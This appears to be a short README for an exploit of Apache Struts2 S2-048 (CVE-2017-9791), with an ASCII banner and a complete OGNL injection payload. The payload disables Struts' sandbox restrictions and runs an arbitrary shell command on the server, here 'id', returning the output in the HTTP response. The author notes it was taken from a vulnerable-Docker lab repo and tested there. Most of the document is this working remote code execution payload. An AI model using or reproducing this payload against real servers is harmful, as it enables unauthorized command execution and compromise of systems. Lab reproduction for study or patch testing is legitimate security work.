# s2-048
Exp for s2-048, CVE-2017-9791.
```
  ______     _______     ____   ___  _ _____     ___ _____ ___  _ 
 / ___\ \   / / ____|   |___ \ / _ \/ |___  |   / _ \___  / _ \/ |
| |    \ \ / /|  _| _____ __) | | | | |  / /___| (_) | / / (_) | |
| |___  \ V / | |__|_____/ __/| |_| | | / /_____\__, |/ / \__, | |
 \____|  \_/  |_____|   |_____|\___/|_|/_/        /_//_/    /_/|_|

```

poc:
```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
This is a  poc from https://github.com/Loneyers/vuldocker/tree/master/struts2/s2-048, I build a docker and successfully get the same result, but there is still some errors in my python script. 


